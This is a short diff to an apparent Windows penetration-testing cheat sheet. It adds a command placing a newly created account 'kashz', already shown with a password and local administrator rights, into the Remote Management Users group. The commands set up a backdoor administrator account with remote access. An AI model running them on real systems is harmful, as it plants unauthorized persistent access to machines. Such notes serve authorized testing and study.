@@ -13,6 +13,7 @@ Start-Process -NoNewWindow -FilePath FILE -ArgumentList "ARGS" [-Credential $cre
 # add new user
 net user kashz iamR00t123! /add
 net localgroup administrators kashz /add
+net localgroup "Remote Management Users" kashz /add
 ```
 
 ## DLL hijacking
